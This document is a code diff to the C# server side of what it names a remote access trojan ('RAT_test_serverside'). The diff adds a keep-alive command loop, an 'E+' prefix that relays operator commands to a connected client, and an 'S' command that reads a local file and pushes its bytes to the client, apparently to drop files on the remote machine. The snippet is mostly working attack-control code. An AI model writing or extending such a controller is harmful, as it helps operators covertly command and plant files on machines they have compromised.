@@ -14,6 +14,8 @@ namespace RAT_test_serverside
         private static TcpListener listener;
         private static TcpClient client;
 
+        private static bool keepAlive;
+
         static void Main(string[] args)
         {
             //Create the tcplistener and start it 
@@ -34,29 +36,53 @@ namespace RAT_test_serverside
                     //Get the data and print it out
                     string data = sr.ReadLine();
                     Console.WriteLine("Connected to: " + data);
+                    keepAlive = true;
 
-                } catch (Exception e) { Console.WriteLine(e); }
+                }
+                catch (Exception e)
+                {
+                    Console.WriteLine(e);
+                    keepAlive = false;
+                }
 
-                while (true)
+                while (keepAlive)
                 {
                     Console.WriteLine();
                     Console.WriteLine("Enter Command:");
                     cmd = Console.ReadLine();
 
-                    //Send data
-                    try
+                    if (cmd.StartsWith("E+"))
                     {
-                        Console.WriteLine("Sending: " + cmd);
-                        sw.WriteLine(cmd);
+                        //Send data
+                        try
+                        {
+                            Console.WriteLine("Sending: " + cmd);
+                            sw.WriteLine(cmd);
+                            sw.Flush();
+                        }
+                        catch (Exception e) { }
+                    }
+
+                    if (cmd.StartsWith("S"))
+                    {
+                        string[] sendArgs = cmd.Split(null);
+
+                        FileStream fs = new FileStream(sendArgs[1], FileMode.Open, FileAccess.Read);
+                        byte[] data = readToBytes(fs);
+
+                        string dataString = string.Join("+", data);
+                        Console.WriteLine("Sending File: " + sendArgs[1]);
+                        string test = "S " + sendArgs[1] + " " + dataString;
+                        sw.WriteLine("S_" + sendArgs[1] + "_" + dataString);
                         sw.Flush();
                     }
-                    catch (Exception e) { }
 
                     //Get data
                     try
                     {
                         Console.WriteLine();
                         Console.WriteLine("OUTPUT:");
+
                         string data = String.Empty;
                         data = sr.ReadLine();
                         while (sr.Peek() != -1)
@@ -67,6 +93,15 @@ namespace RAT_test_serverside
                     } catch(Exception e) { }
                 }
                 client.Close();
+            }
+        }
+
+        public static byte[] readToBytes(Stream inputStream)
+        {
+            using (MemoryStream ms = new MemoryStream())
+            {
+                inputStream.CopyTo(ms);
+                return ms.ToArray();
             }
         }
 
